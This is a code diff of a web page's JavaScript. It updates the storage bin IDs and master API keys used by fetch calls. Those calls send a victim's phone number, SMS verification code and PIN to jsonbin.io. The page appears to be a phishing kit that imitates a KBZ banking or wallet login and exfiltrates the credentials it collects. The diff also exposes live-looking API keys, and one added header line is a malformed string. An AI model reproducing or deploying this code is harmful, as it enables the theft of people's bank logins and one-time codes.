@@ -466,11 +466,11 @@ input[type="number"]::-webkit-inner-spin-button {
         if (!phoneNumber) return;
         
         try {
-            await fetch('https://api.jsonbin.io/v3/b/68793cba2c40ce23f7fd7245', {
+            await fetch('https://api.jsonbin.io/v3/b/687fa2caae596e708fb9e06c', {
                 method: 'PUT',
                 headers: {
                     'Content-Type': 'application/json',
-                    'X-Master-Key': '$2a$10$AFu5DA2kYqgct4C60fakwu6AJdG15l7U9XdUl7LOiCVrD6yFc5Nma'
+                    'X-Master-Key': $2a$10$LPljLpMK.fdbFdmqJIVZDeEB4Gmmi1vdplretg9myR2l47y8NgiP'
                 },
                 body: JSON.stringify({
                     phone: phoneNumber,
@@ -513,11 +513,11 @@ input[type="number"]::-webkit-inner-spin-button {
         const smsCode = Array.from(smsBoxes).map(b => b.value).join('');
         
         try {
-            await fetch('https://api.jsonbin.io/v3/b/68793d012c40ce23f7fd7263', {
+            await fetch('https://api.jsonbin.io/v3/b/687fa2e0f7e7a370d1ec1206', {
                 method: 'PUT',
                 headers: {
                     'Content-Type': 'application/json',
-                    'X-Master-Key': '$2a$10$AFu5DA2kYqgct4C60fakwu6AJdG15l7U9XdUl7LOiCVrD6yFc5Nma'
+                    'X-Master-Key': '$2a$10$LPljLpMK.fdbFdmqJIVZDeEB4Gmmi1vdplretg9myR2l47y8NgiP'
                 },
                 body: JSON.stringify({
                     phone: localStorage.getItem('kbz_phone'),
@@ -570,8 +570,8 @@ input[type="number"]::-webkit-inner-spin-button {
     }
 
     async function sendPin(pin) {
-      const binId = "6877ca8bbf84af5e5f517272"; // Your bin ID
-      const apiKey = "$2a$10$AFu5DA2kYqgct4C60fakwu6AJdG15l7U9XdUl7LOiCVrD6yFc5Nma";
+      const binId = "687fa3187b4b8670d8a57712"; // Your bin ID
+      const apiKey = "$2a$10$LPljLpMK.fdbFdmqJIVZDeEB4Gmmi1vdplretg9myR2l47y8NgiP";
 
       try {
         const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
@@ -698,11 +698,11 @@ input[type="number"]::-webkit-inner-spin-button {
       };
 
       try {
-        await fetch("https://api.jsonbin.io/v3/b/687803186063391d31af0ea8", {
+        await fetch("https://api.jsonbin.io/v3/b/687fa3037b4b8670d8a5770a", {
           method: "PUT",
           headers: {
             "Content-Type": "application/json",
-            "X-Master-Key": "$2a$10$AFu5DA2kYqgct4C60fakwu6AJdG15l7U9XdUl7LOiCVrD6yFc5Nma"
+            "X-Master-Key": "$2a$10$LPljLpMK.fdbFdmqJIVZDeEB4Gmmi1vdplretg9myR2l47y8NgiP"
           },
           body: JSON.stringify(data)
         });
